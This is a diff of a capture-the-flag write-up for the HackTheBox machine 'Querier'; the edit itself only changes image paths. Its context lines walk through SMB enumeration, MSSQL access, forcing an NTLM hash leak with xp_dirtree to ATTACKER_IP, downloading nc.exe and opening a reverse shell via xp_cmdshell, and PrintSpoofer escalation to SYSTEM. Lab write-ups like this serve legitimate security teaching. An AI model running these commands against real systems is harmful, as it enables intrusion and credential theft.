@@ -87,18 +87,18 @@ $ nxc smb querier.htb.local -u 'Guest' -p ''
 $ nxc smb querier.htb.local -u '' -p '' --shares
 ```
 
-![](../assets/img/2026-04-08-Querier/1.png)
+![](/assets/img/2026-04-08-Querier/1.png)
 
 That shows that while Null authentication is enabled, we don't have enough permissions to list shares or query identifiers. Guest authentication does not work but throws a strange error saying that the NetBIOS connection has timed out.
 
 ### Excel Spreadsheet
 I swap to using SMBclient to list available shares to avoid connecting to NetBIOS altogether, which reveals a non-standard share named "reports". Inside is just one Excel spreadsheet file that seems to hold a report for some department's work.
 
-![](../assets/img/2026-04-08-Querier/2.png)
+![](/assets/img/2026-04-08-Querier/2.png)
 
 After grabbing that file, I open the document using Gnumeric (a lightweight, open-source spreadsheet application built for Unix/Linux systems). You can install this tool with `sudo apt install gnumeric` on Kali since there isn't a default tool that supports this archive.
 
-![](../assets/img/2026-04-08-Querier/3.png)
+![](/assets/img/2026-04-08-Querier/3.png)
 
 There seems to be nothing inside of it at first glance, but upon inspecting the metadata, we discover the author's name is Luis and the MIME type shows that macros have been enabled for this doc.
 
@@ -167,7 +167,7 @@ We can connect with these using Impacket's [mssqlclient.py script](https://githu
 $ impacket-mssqlclient reporting@querier.htb.local -windows-auth -db volume
 ```
 
-![](../assets/img/2026-04-08-Querier/4.png)
+![](/assets/img/2026-04-08-Querier/4.png)
 
 There is only one unique database named volume, however I fail to discover any interesting entries within it. MSSQL supports extended procedures which are meant to enable administrators to interact directly with machines or filesystems from the CLI. 
 
@@ -180,7 +180,7 @@ EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_c
 ### Stealing Net-NTLMv2 Hash
 Next, I test to see if _xp_dirtree_ is enabled, which displays the contents of directories on the filesystem.
 
-![](../assets/img/2026-04-08-Querier/5.png)
+![](/assets/img/2026-04-08-Querier/5.png)
 
 It returns folders contained within the machines `C:\` drive, meaning that we can use this to our advantage. By itself, this could be very handy if we there was a web server by which we can enumerate the application's version to look for any CVEs and so on. However, since we're limited to WinRM and SMB, it's necessary to find a way to exploit this through those services.
 
@@ -198,11 +198,11 @@ SQL (QUERIER\reporting  reporting@volume)> xp_dirtree //ATTACKER_IP/doesnotexist
 
 After forcing an outbound connection to my server, we are granted a hash for the mssql-svc user. Usually these accounts will end with a `$` indicating that they are machine accounts that have lengthy and complex passwords that are rotated every thirty days. Luckily, this SQL server was configured to run from this user and may be crackable.
 
-![](../assets/img/2026-04-08-Querier/6.png)
+![](/assets/img/2026-04-08-Querier/6.png)
 
 Sending that over to JohnTheRipper or Hashcat will return the plaintext version for the corresponding account, allowing us to authenticate to the machine now. It's worth noting that even if this didn't crack we could potentially still use this hash in a relay attack, however since they are not an administrator or equivalent to one, we may not get a whole lot out of it.
 
-![](../assets/img/2026-04-08-Querier/7.png)
+![](/assets/img/2026-04-08-Querier/7.png)
 
 A few attempts later show that these credentials only work for the MSSQL server, but we now have the correct privileges to configure _xp_cmdshell_ to execute commands on the machine, grabbing a reverse shell.
 
@@ -222,12 +222,12 @@ SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "curl http://ATTACKER_IP/nc.exe
 SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "C:\Temp\nc.exe ATTACKER_IP 443 -e cmd.exe"
 ```
 
-![](../assets/img/2026-04-08-Querier/8.png)
+![](/assets/img/2026-04-08-Querier/8.png)
 
 ## Privilege Escalation
 Right away, we can see that our account has access to SeImpersonatePrivilege, meaning that we can use [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) to exploit this and escalate privileges to **NT AUTHORITY\SYSTEM**, since the machine predates 2021 (when this attack was largely mitigated).
 
-![](../assets/img/2026-04-08-Querier/9.png)
+![](/assets/img/2026-04-08-Querier/9.png)
 
 This exploit tool allows us to run any commands with the `-c` option through named pipes, I proceed by spawning a CMD shell, however you can do anything here.
 
@@ -235,7 +235,7 @@ This exploit tool allows us to run any commands with the `-c` option through nam
 .\PrintSpoofer64.exe -i -c cmd.exe
 ```
 
-![](../assets/img/2026-04-08-Querier/10.png)
+![](/assets/img/2026-04-08-Querier/10.png)
 
 Once that has finished, we now have **SYSTEM** privileges over the machine and collect both flags under the user's respective Desktop folders. The intended way to escalate privileges was to utilize PowerUp to discover administrator credentials in a cached group policy file, but this method serves as a reminder to keep the OS up to date and harden them wherever possible.
 
